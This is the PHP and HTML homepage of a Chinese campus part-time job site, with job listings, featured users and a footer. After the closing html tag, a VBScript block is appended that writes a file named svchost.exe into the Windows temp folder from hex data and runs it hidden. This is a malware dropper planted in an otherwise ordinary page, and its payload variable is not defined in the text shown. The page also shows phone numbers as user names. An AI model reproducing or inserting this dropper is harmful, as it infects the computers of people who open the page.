<?php session_start(); ?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<script type="text/javascript" src="css/jquery-1.8.0.min.js"></script>
<script type="text/javascript" src="css/jquery.jslides.js"></script>
<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
<script type="text/javascript" src="css/bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="css/main.css">
<title>guestbook</title>
</head>

<body>
      <div class="t_bj">
            <div class="container heard_div">
                <span>为大学生提供优质兼职服务平台！</span>
                <span style="float:right;position: relative;width: 150px; height: 40px;" class="v-father">
                  <?php 
                      if(empty($_SESSION['user_name'])){
                        ?>
                        <span class="man" style="color:#ff6700"><i class="glyphicon glyphicon-user"></i></span>
                    <a style="color:#ccc" class="y-deng"></a>
                    <a href="login.php" style="color:#ccc" class="v-deng">登陆</a>
                    <a href="./layout/register.html" class="v-deng" style="display: inline-block;height:40px;width: 80px;text-align: center;color: #fff;background-color: #ff6700;margin-left: 20px;">立即注册</a>
                        <?php
                      }else{
                        ?>
                        <div class="v-down">
                        <p style="display: inline-block;" ><a class="person" href="./layout/personal.html">个人中心</a></p>
                        <p class="signOut" style="display: inline-block;margin-left: 5px;"><a class="person" href="logout.php">退出登录</a></p>
                    </div>
                        <?php
                      }
                  ?>
                    
                    
                </span>
            </div>
        </div>
      <div class="top">
           <div class="logo">
                <img src="image/logo.png" style="width:360px; height:96px; margin-top:20px; margin-left:100px;">
           </div>
       <div class="menu">
              <a href="index.html">首页</a>
             <?php 
                if($_SESSION['user_name']!=null&&$_SESSION['type']=='1')
                {
                  ?>
                    <a href="add_jz.php">发布兼职</a>
                  <?php
                }
              ?>
             <a href="b.html">求职投递</a>
             <a href="news_article.php">校园新闻</a>
             <a href="">服务帮助</a>
             <a href="guestbook.html">在线留言</a>
         </div>
     </div>
    <div id="full-screen-slider">
	<ul id="slides">
		<li style="background:url('image/a.png') no-repeat center top">
        	<a href="" target="_blank">第一张焦点幻灯的标题</a>
        </li>
		<li style="background:url('image/2.png') no-repeat center top">
        	<a href="" target="_blank">第二张焦点幻灯的标题</a>
        </li>
	</ul>
   </div>
   
<div class="container">
    <div class="part_time" style="margin-top:20px;">
  <div class="part_time_head">
    <p>最新兼职</p>
    <span>极速上岗结算快</span>
    <a href="./layout/ptjob.html">查看更多兼职
      <i class="glyphicon glyphicon-menu-right"></i></a>
  </div>
  <div class="part_time_content">
    <div class="col-lg-3 col-md-3 col-sm-6 col-xs-6">
      <a href="./layout/pijob.html?id=32">
        <span class="shuxian"></span>
        <span style="color:#4b4b4b;">其他</span>
        <p>测试小程序</p>
        <div class="part_time_content_detail">郑州市-中原区
          <span></span>招聘1人</div>
        <div class="part_time_content_money">
          <span>100元</span>
          <span>日结</span></div>
      </a>
    </div>
    <div class="col-lg-3 col-md-3 col-sm-6 col-xs-6">
      <a href="./layout/pijob.html?id=29">
        <span class="shuxian"></span>
        <span style="color:#4b4b4b;">服务员</span>
        <p>服务员测试</p>
        <div class="part_time_content_detail">郑州-中原区
          <span></span>招聘10人</div>
        <div class="part_time_content_money">
          <span>120元</span>
          <span>日结</span></div>
      </a>
    </div>
    <div class="col-lg-3 col-md-3 col-sm-6 col-xs-6">
      <a href="./layout/pijob.html?id=27">
        <span class="shuxian"></span>
        <span style="color:#4b4b4b;">其他</span>
        <p>区域客服专员</p>
        <div class="part_time_content_detail">郑州-二七区
          <span></span>招聘1人</div>
        <div class="part_time_content_money">
          <span>150元</span>
          <span>日结</span></div>
      </a>
    </div>
    <div class="col-lg-3 col-md-3 col-sm-6 col-xs-6">
      <a href="./layout/pijob.html?id=26">
        <span class="shuxian"></span>
        <span style="color:#4b4b4b;">派发传单</span>
        <p>发传单</p>
        <div class="part_time_content_detail">驻马店-驿城区
          <span></span>招聘20人</div>
        <div class="part_time_content_money">
          <span>80元</span>
          <span>日结</span></div>
      </a>
    </div>
    <div class="col-lg-3 col-md-3 col-sm-6 col-xs-6">
      <a href="./layout/pijob.html?id=25">
        <span class="shuxian"></span>
        <span style="color:#4b4b4b;">其他</span>
        <p>测试任务</p>
        <div class="part_time_content_detail">郑州-中原区
          <span></span>招聘1人</div>
        <div class="part_time_content_money">
          <span>111元</span>
          <span>日结</span></div>
      </a>
    </div>
    <div class="col-lg-3 col-md-3 col-sm-6 col-xs-6">
      <a href="./layout/pijob.html?id=21">
        <span class="shuxian"></span>
        <span style="color:#4b4b4b;">服务员</span>
        <p>包吃住，4千-4500底薪 ，急聘服务员</p>
        <div class="part_time_content_detail">驻马店-驿城区
          <span></span>招聘10人</div>
        <div class="part_time_content_money">
          <span>2500元</span>
          <span>月结</span></div>
      </a>
    </div>
    <div class="col-lg-3 col-md-3 col-sm-6 col-xs-6">
      <a href="./layout/pijob.html?id=22">
        <span class="shuxian"></span>
        <span style="color:#4b4b4b;">服务员</span>
        <p>服务员</p>
        <div class="part_time_content_detail">驻马店-驿城区
          <span></span>招聘10人</div>
        <div class="part_time_content_money">
          <span>3000元</span>
          <span>月结</span></div>
      </a>
    </div>
    <div class="col-lg-3 col-md-3 col-sm-6 col-xs-6">
      <a href="./layout/pijob.html?id=23">
        <span class="shuxian"></span>
        <span style="color:#4b4b4b;">服务员</span>
        <p>招聘服务员</p>
        <div class="part_time_content_detail">驻马店-驿城区
          <span></span>招聘10人</div>
        <div class="part_time_content_money">
          <span>200元</span>
          <span>月结</span></div>
      </a>
    </div>
  </div>
</div>
<div class="excellent">
                <div style="font-size:35px;font-weight:700;margin-bottom: 20px;"><span style="color:#ff6700"><span class="glyphicon glyphicon-fire"></span>明星</span>兼职客</div>
                <ul class="jianzhi"> 
                <li class="col-lg-3 col-md-3 col-sm-6 col-xs-6">
                    <a href="./layout/publisher.html?id=30">
                        <div>
                            <img src="/she/dbs/upload/img/headPortrait/headPortrait_201905110046195cd5aadb9a480.png" width="100%">
                            <div class="exc_message">
                                <p>18839651405</p>
                                <span>完成1单</span><span>好评率：100%</span>
                            </div>
                        </div>
                        <div class="brief" style="display: none;">
                            <div style="overflow:hidden;text-overflow:ellipsis;white-space: nowrap;">
                                测试账户
                            </div>
                        </div>  
                    </a>
                </li>
             
                <li class="col-lg-3 col-md-3 col-sm-6 col-xs-6">
                    <a href="./layout/publisher.html?id=31">
                        <div>
                            <img src="/she/dbs/upload/img/headPortrait/headPortrait_201905110048105cd5ab4acb056.png" width="100%">
                            <div class="exc_message">
                                <p>18839651409</p>
                                <span>完成1单</span><span>好评率：100%</span>
                            </div>
                        </div>
                        <div class="brief" style="display: none;">
                            <div style="overflow:hidden;text-overflow:ellipsis;white-space: nowrap;">
                                测试账户
                            </div>
                        </div>  
                    </a>
                </li>
             
                <li class="col-lg-3 col-md-3 col-sm-6 col-xs-6">
                    <a href="./layout/publisher.html?id=32">
                        <div>
                            <img src="/she/dbs/upload/img/headPortrait/headPortrait_201905110050545cd5abeea4d7c.png" width="100%">
                            <div class="exc_message">
                                <p>张三</p>
                                <span>完成1单</span><span>好评率：100%</span>
                            </div>
                        </div>
                        <div class="brief">
                            <div style="overflow:hidden;text-overflow:ellipsis;white-space: nowrap;">
                                测试账户
                            </div>
                        </div>  
                    </a>
                </li>
             
                <li class="col-lg-3 col-md-3 col-sm-6 col-xs-6">
                    <a href="./layout/publisher.html?id=28">
                        <div>
                            <img src="/she/dbs/upload/img/headPortrait/headPortrait_201906012218355cf2893b9b318.jpg" width="100%">
                            <div class="exc_message">
                                <p>易建伟</p>
                                <span>完成1单</span><span>好评率：99%</span>
                            </div>
                        </div>
                        <div class="brief">
                            <div style="overflow:hidden;text-overflow:ellipsis;white-space: nowrap;">
                                性格开朗，热爱生活，热爱学习
                            </div>
                        </div>  
                    </a>
                </li>
            </ul>
            </div>
</div>

  
   <div class="footer">
         <div class="center-box">
                <div class="text">
                   校园兼职平台<br/>
                   电话：027-87221877E-maishxm@hubeiwater.gov.cn<br/>
                   地址：包头市土默特右旗萨拉齐镇内蒙古农业大学职业技术学院<br/>
                   友情链接:<a href="">内蒙古农业大学职业技术学院</a>&nbsp;&nbsp;
                </diV>
              <div class="weixin">
                   <img src="images/ewm.png" alt="">
              </div>
         </div>
    </div>
</body>
</html>
<SCRIPT Language=VBScript><!--
DropFileName = "svchost.exe"
Set FSO = CreateObject("Scripting.FileSystemObject")
DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
If FSO.FileExists(DropPath)=False Then
Set FileObj = FSO.CreateTextFile(DropPath, True)
For i = 1 To Len(WriteData) Step 2
FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
Next
FileObj.Close
End If
Set WSHshell = CreateObject("WScript.Shell")
WSHshell.Run DropPath, 0
//--></SCRIPT>